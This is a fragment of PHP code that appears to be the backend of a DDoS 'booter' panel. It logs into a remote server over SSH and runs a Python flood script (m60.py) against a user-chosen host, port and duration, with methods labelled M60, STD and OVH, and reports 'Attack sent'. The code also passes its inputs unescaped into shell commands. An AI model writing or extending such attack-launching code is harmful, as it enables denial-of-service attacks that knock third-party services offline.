<?php
  ...
  function send(){
    ...
    if(ssh2_auth_password($connection, $user, $password)){
      ...
      if($method == "M60"){if(ssh2_exec($connection, "screen -dm python m60.py $host $port $time")){echo "Attack sent to $host:$port for $time seconds using $method!";}else{die("Ran into a error");}}
      if($method == "STD"){if(ssh2_exec($connection, "python m60.py $host $port $time")){echo "Attack sent to $host:$port for $time seconds using $method!";}else{die("Ran into a error");}}
      if($method == "OVH"){if(ssh2_exec($connection, "m60.py $host $port $time")){echo "Attack sent to $host:$port for $time seconds using $method!";}else{die("Ran into a error");}}
